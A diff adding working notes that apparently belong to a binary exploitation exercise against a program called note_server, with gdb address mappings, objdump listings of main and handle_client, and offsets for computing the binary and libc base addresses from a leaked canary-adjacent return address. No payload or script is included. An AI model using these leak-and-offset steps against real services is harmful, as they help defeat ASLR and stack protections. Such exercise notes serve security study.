@@ -1,0 +1,55 @@
+################################################################################
+BIN BASE OFFSET CALCULATION:
+################################################################################
+gdb info proc addresses vs canary leaker
+55acc8fb5674
+55acc8fb4000
+
+559017c1f674
+559017c1e000
+
+$ objdump -D /home/user/note_server | grep main
+ a1d:   48 8d 3d 26 03 00 00    lea    0x326(%rip),%rdi        # d4a <main>
+ a24:   ff 15 b6 15 20 00       callq  *0x2015b6(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
+0000000000001468
+0000000000000d4a <main>:
+ dc9:   79 16                   jns    de1 <main+0x97>
+ e14:   79 0c                   jns    e22 <main+0xd8>
+ e90:   79 16                   jns    ea8 <main+0x15e>
+ eef:   79 16                   jns    f07 <main+0x1bd>
+ f19:   79 16                   jns    f31 <main+0x1e7>
+ f38:   75 24                   jne    f5e <main+0x214>
+ f6b:   e9 54 ff ff ff          jmpq   ec4 <main+0x17a>
+$ objdump -D /home/user/note_server | grep handle         
+ ad7:   48 8b 3d 2a 15 20 00    mov    0x20152a(%rip),%rdi        # 202008 <__dso_handle>
+0000000000000b0a <handle_client>:
+ b53:   74 0a                   je     b5f <handle_client+0x55>
+ b6c:   0f 84 c1 00 00 00       je     c33 <handle_client+0x129>
+ b75:   0f 84 93 01 00 00       je     d0e <handle_client+0x204>
+ b7e:   0f 85 ba 01 00 00       jne    d3e <handle_client+0x234>
+ ba4:   74 0a                   je     bb0 <handle_client+0xa6>
+ bc8:   7e 0a                   jle    bd4 <handle_client+0xca>
+ c11:   74 0a                   je     c1d <handle_client+0x113>
+ c2e:   e9 0b 01 00 00          jmpq   d3e <handle_client+0x234>
+ c53:   74 0a                   je     c5f <handle_client+0x155>
+ c6d:   73 0a                   jae    c79 <handle_client+0x16f>
+ c99:   74 0a                   je     ca5 <handle_client+0x19b>
+ cae:   76 0a                   jbe    cba <handle_client+0x1b0>
+ d0c:   eb 30                   jmp    d3e <handle_client+0x234>
+ d3a:   74 0c                   je     d48 <handle_client+0x23e>
+ d3c:   eb 05                   jmp    d43 <handle_client+0x239>
+ d3e:   e9 f0 fd ff ff          jmpq   b33 <handle_client+0x29>
+ f4f:   e8 b6 fb ff ff          callq  b0a <handle_client>
+0000000000202008 <__dso_handle>:
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+0x1674 <- base starts at canary return subtracted by this
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+################################################################################
+LIBC BASE
+################################################################################
+0x7f1f6dd6a660
+0x7f1f6dc7c000
+0x0000000ee660
